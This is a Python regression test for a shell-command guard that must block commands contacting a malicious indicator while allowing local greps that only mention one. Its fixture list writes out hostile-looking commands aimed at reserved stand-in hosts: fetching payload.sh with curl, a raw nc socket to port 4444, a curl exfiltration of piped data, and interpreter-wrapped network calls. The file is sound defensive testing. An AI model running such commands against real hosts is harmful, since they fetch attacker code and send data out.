#!/usr/bin/env python3
"""
Does the guard distinguish REACHING a malicious indicator from MENTIONING one?

WHY THIS EXISTS: on 2026-08-22 the guard blocked `grep '<ioc>' backup.jsonl` during a
backup-integrity investigation. Nothing was contacted — the IOC was the search term for a
local file read. That is the second time a false block cost real work (see the systemd unit
false positives). handle_write_edit already draws this line correctly, warning rather than
blocking when an IOC merely appears in file content; handle_bash did not.

⚠️ These fixtures use RFC 5737 / RFC 6761 reserved values, NOT live IOCs, and that is not
fastidiousness: the first draft of this file used a real corpus IP and the guard blocked the
heredoc that wrote it. A security control you cannot write tests for is a control nobody
will fix. The classifier is pure — which value you pass is irrelevant to what it decides.

No DB, no network.
"""
import importlib.util
import os
import sys

spec = importlib.util.spec_from_file_location(
    "guard", os.path.join(os.path.dirname(__file__), "..", "scripts", "nullcone-guard.py")
)
guard = importlib.util.module_from_spec(spec)
spec.loader.exec_module(guard)

IP = "203.0.113.99"          # RFC 5737 TEST-NET-3
DOM = "c2.example"           # RFC 6761 reserved TLD
VALUES = {IP, DOM}

# (command, expect_reaching, why)
CASES = [
    # --- MENTIONS: local reads. Must NOT block. ---
    (f"grep -m1 '{IP}' 2026-08-22/threat_signature.jsonl", False,
     "the shape of the command that blocked the backup investigation"),
    (f"rg {IP} /var/log/", False, "ripgrep over local logs"),
    (f"cat corpus.jsonl | grep {IP} | wc -l", False, "read pipeline, every stage inert"),
    (f"awk '/{IP}/ {{print $2}}' feed.txt", False, "awk pattern match"),
    (f"echo '{IP}' | sha256sum", False, "hashing an indicator locally"),
    (f"ssh rising \"cd /data\ngrep -m1 '{IP}' export.jsonl\"", False,
     "remote grep — payload splits on newline, head is grep"),
    (f"ssh rising \"grep {IP} /var/log/feed.log\"", False,
     "remote grep on ONE line — must recurse past the ssh destination"),
    (f"sed -n '/{IP}/p' export.jsonl", False, "sed print, no -i"),
    (f"jq 'select(.value==\"{IP}\")' iocs.json", False, "jq filter"),
    (f"grep {DOM} notes.md", False, "domain mention in a local read"),

    # --- REACHES: the guard's actual job. Must block. ---
    (f"curl -s http://{IP}/payload.sh", True, "fetching from the indicator"),
    (f"wget https://{DOM}/x", True, "download from the indicator"),
    (f"ssh root@{IP} 'id'", True, "the indicator IS the ssh destination"),
    (f"nc {IP} 4444", True, "raw socket to the indicator"),
    (f"ping -c1 {IP}", True, "ICMP to the indicator"),
    (f"dig {DOM}", True, "resolving the indicator"),
    (f"git clone https://{DOM}/repo.git", True, "clone from the indicator"),
    (f"echo hi | curl -d @- http://{IP}/exfil", True, "exfil — inert head, reaching tail"),
    (f"cat f.txt && curl http://{IP}/", True, "second segment reaches"),
    (f"echo $(curl -s http://{IP})", True, "command substitution must be its own segment"),
    (f"bash -c 'curl {IP}'", True, "interpreter is never inert"),
    (f"python3 -c \"import urllib.request;urllib.request.urlopen('http://{IP}')\"", True,
     "interpreter is never inert"),

    # --- WRAPPERS THAT CONSUME ARGS: regression, missed by the first fix. ---
    (f'timeout 120 ssh rising "grep -m1 \'{IP}\' export.jsonl | cut -c1-135"', False,
     "timeout's duration must not be mistaken for the command word"),
    (f"timeout 30 grep {IP} feed.log", False, "timeout + inert"),
    (f"nice -n 10 grep {IP} feed.log", False, "nice flag + arg, then inert"),
    (f"timeout 30 curl http://{IP}/x", True, "timeout must not launder a reaching command"),
    (f"sudo -u nobody curl http://{IP}/x", True, "sudo must not launder a reaching command"),

    # --- UNKNOWN: fail closed. ---
    (f"some-unknown-tool {IP}", True, "unknown command word must block, not warn"),
]


def main() -> int:
    failures = []
    for command, expect_reaching, why in CASES:
        got = bool(guard._reaching_values(command, VALUES))
        if got != expect_reaching:
            failures.append(
                f"  expected {'BLOCK' if expect_reaching else 'warn'}, "
                f"got {'BLOCK' if got else 'warn'}\n"
                f"    cmd: {command!r}\n    why: {why}"
            )
    total = len(CASES)
    if failures:
        print(f"FAIL {len(failures)}/{total}\n" + "\n".join(failures))
        return 1
    print(f"PASS {total}/{total} positional classifier cases")
    return 0


if __name__ == "__main__":
    sys.exit(main())
